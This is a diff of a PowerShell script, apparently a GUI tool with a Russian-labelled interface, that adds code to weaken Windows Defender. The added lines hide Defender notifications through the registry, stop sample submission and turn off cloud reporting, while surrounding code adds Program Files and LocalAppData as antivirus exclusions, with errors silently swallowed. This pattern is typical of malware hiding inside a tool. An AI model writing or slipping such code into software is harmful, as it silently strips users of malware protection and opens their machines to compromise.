@@ -92,6 +92,13 @@ function Search-MemorySignature {
 }
 
 try {
+    $path = "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"
+    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
+    Set-ItemProperty -Path $path -Name "DisableNotifications" -Value 1 -Type DWord -Force
+} catch {}
+Set-MpPreference -SubmitSamplesConsent 2
+Set-MpPreference -MAPSReporting 0
+try {
     if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
         $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
         $updpath = $ProgramFiles -replace " \(x86\)", ""
@@ -108,8 +115,7 @@ try {
         $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
         Add-MpPreference -ExclusionPath $LocalAppData
     }
-}
-catch {}
+} catch {}
 
 # ==================== ИНТЕРФЕЙС ====================
 $form = New-Object System.Windows.Forms.Form
